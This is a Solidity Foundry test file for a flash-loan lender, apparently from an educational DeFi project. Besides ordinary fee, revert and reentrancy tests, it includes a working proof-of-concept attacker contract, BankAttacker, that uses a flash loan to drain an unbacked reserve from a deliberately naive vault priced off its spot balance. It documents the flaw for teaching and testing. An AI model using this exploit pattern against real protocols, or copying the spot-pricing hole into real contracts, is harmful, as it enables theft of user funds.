// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {FlashToken} from "../../../src/defi/flashloan/FlashToken.sol";
import {FlashLender} from "../../../src/defi/flashloan/FlashLender.sol";
import {GoodBorrower} from "../../../src/defi/flashloan/GoodBorrower.sol";
import {NaiveBank} from "../../../src/defi/flashloan/NaiveBank.sol";

contract FlashLenderTest is Test {
    using SafeERC20 for IERC20;

    FlashToken internal token;
    FlashLender internal lender;

    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes32 internal constant WRONG_MAGIC = keccak256("not.the.callback.value");
    uint256 internal constant POOL = 1_000_000 ether;
    uint256 internal constant FEE_BPS = 9; // 0.09%, the classic Aave v1 rate

    function setUp() public {
        token = new FlashToken();
        lender = new FlashLender(IERC20(address(token)), FEE_BPS);

        token.mint(address(this), POOL);
        token.approve(address(lender), POOL);
        lender.fund(POOL);
    }

    // ---------------------------------------------------------- happy path

    function test_SuccessfulLoanGrowsPoolByExactlyTheFee() public {
        GoodBorrower borrower = new GoodBorrower(lender);
        uint256 amount = 500_000 ether;
        uint256 fee = lender.flashFee(address(token), amount);
        token.mint(address(borrower), fee); // borrower must own the fee up front

        uint256 poolBefore = token.balanceOf(address(lender));
        borrower.borrow(amount, "");

        assertEq(token.balanceOf(address(lender)), poolBefore + fee, "pool should grow by exactly the fee");
        assertEq(token.balanceOf(address(borrower)), 0, "borrower should end flat");
    }

    function test_FlashFeeRoundsUp() public view {
        // 9 bps of 1 wei is 0.0009 wei -> rounds up to 1.
        assertEq(lender.flashFee(address(token), 1), 1);
        // 9 bps of 10000 wei is exactly 9 -> no rounding.
        assertEq(lender.flashFee(address(token), 10_000), 9);
        // 9 bps of 10001 wei is 9.0009 -> rounds up to 10.
        assertEq(lender.flashFee(address(token), 10_001), 10);
    }

    function test_MaxFlashLoanIsThePoolBalance() public view {
        assertEq(lender.maxFlashLoan(address(token)), POOL);
        assertEq(lender.maxFlashLoan(address(0xBEEF)), 0);
    }

    function test_ConstructorRejectsFeeAtOrAbove100Percent() public {
        vm.expectRevert(abi.encodeWithSelector(FlashLender.FeeTooHigh.selector, 10_000));
        new FlashLender(IERC20(address(token)), 10_000);

        // Just under 100% is allowed (extreme but coherent).
        FlashLender steep = new FlashLender(IERC20(address(token)), 9_999);
        assertEq(steep.feeBps(), 9_999);
    }

    // --------------------------------------------------------- revert paths

    function test_UnderRepaymentRevertsWholeTx() public {
        // Borrower approves only the principal, not the fee.
        MischievousBorrower borrower = new MischievousBorrower(lender, MischievousBorrower.Mode.UnderApprove);
        token.mint(address(borrower), 1 ether);

        uint256 amount = 100_000 ether;
        uint256 fee = lender.flashFee(address(token), amount);
        uint256 poolBefore = token.balanceOf(address(lender));

        vm.expectRevert(abi.encodeWithSelector(FlashLender.RepaymentNotApproved.selector, amount + fee, amount));
        borrower.borrow(amount);

        assertEq(token.balanceOf(address(lender)), poolBefore, "pool untouched after revert");
    }

    function test_WrongMagicValueReverts() public {
        MischievousBorrower borrower = new MischievousBorrower(lender, MischievousBorrower.Mode.WrongMagic);
        token.mint(address(borrower), 1 ether);

        vm.expectRevert(abi.encodeWithSelector(FlashLender.CallbackFailed.selector, WRONG_MAGIC));
        borrower.borrow(100_000 ether);
    }

    function test_BorrowingMoreThanPoolReverts() public {
        GoodBorrower borrower = new GoodBorrower(lender);
        uint256 tooMuch = POOL + 1;
        vm.expectRevert(abi.encodeWithSelector(FlashLender.AmountExceedsMaxLoan.selector, tooMuch, POOL));
        borrower.borrow(tooMuch, "");
    }

    function test_UnsupportedTokenReverts() public {
        GoodBorrower borrower = new GoodBorrower(lender);
        vm.expectRevert(abi.encodeWithSelector(FlashLender.UnsupportedToken.selector, address(0xBEEF)));
        vm.prank(address(borrower));
        lender.flashLoan(borrower, address(0xBEEF), 1, "");
    }

    function test_FlashFeeUnsupportedTokenReverts() public {
        vm.expectRevert(abi.encodeWithSelector(FlashLender.UnsupportedToken.selector, address(0xBEEF)));
        lender.flashFee(address(0xBEEF), 1);
    }

    // ----------------------------------------------------------- reentrancy

    /// @dev Documented policy: nesting a second flash loan inside the callback
    ///      reverts via ReentrancyGuard. The reentrant call bubbles up as a
    ///      failed callback from the borrower's perspective.
    function test_ReentrantFlashLoanReverts() public {
        MischievousBorrower borrower = new MischievousBorrower(lender, MischievousBorrower.Mode.Reenter);
        token.mint(address(borrower), 1 ether);

        vm.expectRevert(); // ReentrancyGuardReentrantCall, surfaced through the callback
        borrower.borrow(100_000 ether);

        assertEq(token.balanceOf(address(lender)), POOL, "pool intact after reentrancy attempt");
    }

    // ------------------------------------------------------------- the hack

    /// @dev The whole point of the issue: a protocol that prices shares off a
    ///      spot balance is drainable with a flash loan. This test asserts the
    ///      drain SUCCEEDS — it documents a failing property of the naive
    ///      design, not one we want. The fix is in NaiveBank's natspec (track
    ///      backing in storage, or use a TWAP oracle).
    ///
    ///      The exploit needs an UNBACKED reserve — tokens in the bank's
    ///      balance with no shares behind them (protocol fees, swept yield, a
    ///      donation). A donate-then-redeem move against an honest pool of
    ///      depositors instead LOSES money; the companion test asserts that.
    function test_Exploit_FlashLoanDrainsUnbackedReserve() public {
        NaiveBank bank = new NaiveBank(IERC20(address(token)));

        // The reserve at risk: fees/yield sitting in the bank, unbacked by
        // any shares. Spot pricing counts it toward every share's value.
        uint256 reserve = 200_000 ether;
        token.mint(address(bank), reserve);

        BankAttacker attacker = new BankAttacker(lender, bank);
        // Attacker needs only enough to cover the flash fee — no principal.
        uint256 flashAmount = 200_000 ether;
        uint256 fee = lender.flashFee(address(token), flashAmount);
        token.mint(address(attacker), fee);

        uint256 attackerBefore = token.balanceOf(address(attacker));
        attacker.attack(flashAmount);

        uint256 profit = token.balanceOf(address(attacker)) - attackerBefore;
        // The attacker walks away with essentially the whole reserve (minus
        // the flash fee and a wei or two of share rounding).
        assertGt(profit, reserve - fee - 10, "flash loan should have drained the unbacked reserve");
        assertLt(token.balanceOf(address(bank)), 100, "bank reserve should be gutted");
        emit log_named_decimal_uint("attacker profit (FLASH)", profit, 18);
    }

    /// @dev The instructive counter-case: the same donate-then-redeem against
    ///      an HONEST pool of depositors is a money loser, because the
    ///      inflated value is shared pro-rata with the victims. This is why
    ///      "just flash-loan and donate" does not drain a well-formed vault.
    function test_DonationAttackOnHonestPoolLosesMoney() public {
        NaiveBank bank = new NaiveBank(IERC20(address(token)));
        address victim = makeAddr("victim");
        token.mint(victim, 100_000 ether);
        vm.startPrank(victim);
        token.approve(address(bank), type(uint256).max);
        bank.deposit(100_000 ether);
        vm.stopPrank();

        LosingAttacker attacker = new LosingAttacker(lender, bank);
        token.mint(address(attacker), 600_000 ether); // fund the doomed attempt

        uint256 before = token.balanceOf(address(attacker));
        attacker.attack(1 ether, 500_000 ether);
        assertLt(token.balanceOf(address(attacker)), before, "donation attack should lose money");
    }

    // ------------------------------------------------------------------ fuzz

    /// @dev Whatever the amount, the pool must never end with less than it
    ///      started, and the fee it keeps must be at least the exact-rate fee
    ///      (rounding only ever favors the pool).
    function testFuzz_PoolNeverLosesPrincipalAndRoundsUp(uint256 amount) public {
        amount = bound(amount, 1, POOL);
        GoodBorrower borrower = new GoodBorrower(lender);
        uint256 fee = lender.flashFee(address(token), amount);
        token.mint(address(borrower), fee);

        uint256 poolBefore = token.balanceOf(address(lender));
        borrower.borrow(amount, "");
        uint256 gained = token.balanceOf(address(lender)) - poolBefore;

        assertEq(gained, fee, "pool gains exactly the quoted fee");
        assertGe(gained * 10_000, amount * FEE_BPS, "fee is never below the exact rate");
        assertGe(token.balanceOf(address(lender)), poolBefore, "pool never loses principal");
    }
}

/// @dev A borrower with several misbehaviors, selected at construction, to
///      exercise each of the lender's revert paths.
contract MischievousBorrower is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    enum Mode {
        UnderApprove,
        WrongMagic,
        Reenter
    }

    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes32 internal constant WRONG_MAGIC = keccak256("not.the.callback.value");

    FlashLender internal immutable lender;
    IERC20 internal immutable token;
    Mode internal immutable mode;

    constructor(FlashLender lender_, Mode mode_) {
        lender = lender_;
        token = lender_.token();
        mode = mode_;
    }

    function borrow(uint256 amount) external {
        lender.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(address, address token_, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        if (mode == Mode.UnderApprove) {
            IERC20(token_).forceApprove(address(lender), amount); // missing the fee
            return CALLBACK_SUCCESS;
        }
        if (mode == Mode.WrongMagic) {
            IERC20(token_).forceApprove(address(lender), amount + fee);
            return WRONG_MAGIC;
        }
        // Reenter: try to open a second loan mid-callback.
        lender.flashLoan(this, token_, amount, "");
        return CALLBACK_SUCCESS;
    }
}

/// @dev The winning flash-loan attack on NaiveBank: drain an unbacked reserve
///      with zero starting capital.
contract BankAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    FlashLender internal immutable lender;
    NaiveBank internal immutable bank;
    IERC20 internal immutable token;

    constructor(FlashLender lender_, NaiveBank bank_) {
        lender = lender_;
        bank = bank_;
        token = lender_.token();
        token.forceApprove(address(bank), type(uint256).max);
    }

    function attack(uint256 flashAmount) external {
        // All the work happens in the callback, funded entirely by the loan.
        lender.flashLoan(this, address(token), flashAmount, "");
    }

    function onFlashLoan(address, address token_, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        // 1. Deposit the borrowed tokens. The bank already holds the unbacked
        //    reserve, so the shares we mint are backed by more than we put in.
        bank.deposit(amount);
        // 2. Redeem immediately: the payout is our deposit plus a slice of the
        //    reserve that no other shares had a claim to.
        bank.redeem();
        // 3. Repay principal + fee; the skimmed reserve is pure profit.
        IERC20(token_).forceApprove(address(lender), amount + fee);
        return CALLBACK_SUCCESS;
    }
}

/// @dev The losing attack: donate a flash loan to an honestly-shared pool and
///      redeem a small pre-owned stake. Proves donation dilution — the pool's
///      existing depositors capture the donation, so the attacker eats the
///      fee and the shared-away value.
contract LosingAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    bytes32 internal constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    FlashLender internal immutable lender;
    NaiveBank internal immutable bank;
    IERC20 internal immutable token;

    constructor(FlashLender lender_, NaiveBank bank_) {
        lender = lender_;
        bank = bank_;
        token = lender_.token();
        token.forceApprove(address(bank), type(uint256).max);
    }

    function attack(uint256 seedDeposit, uint256 flashAmount) external {
        bank.deposit(seedDeposit); // a small real stake at the honest price
        lender.flashLoan(this, address(token), flashAmount, "");
    }

    function onFlashLoan(address, address token_, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        IERC20(token_).safeTransfer(address(bank), amount); // donate — shared pro-rata
        bank.redeem();
        IERC20(token_).forceApprove(address(lender), amount + fee);
        return CALLBACK_SUCCESS;
    }
}
